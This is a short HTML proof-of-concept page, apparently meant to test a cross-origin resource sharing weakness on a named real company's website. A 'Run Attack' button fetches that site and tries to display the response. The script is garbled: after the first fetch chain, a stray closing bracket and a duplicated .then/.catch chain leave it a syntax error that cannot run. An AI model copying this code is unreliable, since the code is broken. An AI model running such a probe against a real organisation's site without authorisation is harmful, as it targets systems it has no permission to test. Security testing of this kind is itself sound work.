<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>CORS POC</title>
</head>
<body>
  <h1>CORS Test</h1>
  <button onclick="attack()">Run Attack</button>
  <pre id="output"></pre>

  <script>
    function attack() {
fetch("https://www.rockwellautomation.com", {
  method: "GET"
})
.then(r => r.text())
.then(d => console.log(d))
.catch(e => console.error(e));
      })
      .then(res => res.text())
      .then(data => {
        document.getElementById("output").innerText = data;
      })
      .catch(err => {
        document.getElementById("output").innerText = err;
      });
    }
  </script>
</body>
</html>
